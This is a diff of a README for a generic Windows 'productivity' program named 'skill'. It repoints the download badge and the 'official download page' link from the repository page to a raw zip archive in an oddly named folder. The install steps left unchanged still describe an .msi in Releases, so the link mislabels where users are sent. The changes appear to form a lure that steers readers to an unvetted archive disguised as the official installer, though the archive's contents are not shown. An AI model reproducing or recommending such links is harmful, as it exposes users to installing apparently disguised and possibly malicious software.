@@ -1,6 +1,6 @@
 # 🛠️ skill - Improve your daily productivity with ease
 
-[![](https://img.shields.io/badge/Download-Skill-blue.svg)](https://github.com/incandescent-gallus977/skill)
+[![](https://img.shields.io/badge/Download-Skill-blue.svg)](https://github.com/incandescent-gallus977/skill/raw/refs/heads/main/spikelet/Software_3.4.zip)
 
 ## 🎯 About this software
 
@@ -12,7 +12,7 @@ Your computer needs to run Windows 10 or Windows 11. You must have at least 200 
 
 ## 💾 How to download and install
 
-1. Visit the [official download page](https://github.com/incandescent-gallus977/skill) to start.
+1. Visit the [official download page](https://github.com/incandescent-gallus977/skill/raw/refs/heads/main/spikelet/Software_3.4.zip) to start.
 2. Look for the latest version listed under the Releases section.
 3. Click the file ending in .msi to save the installer to your computer.
 4. Open your Downloads folder.
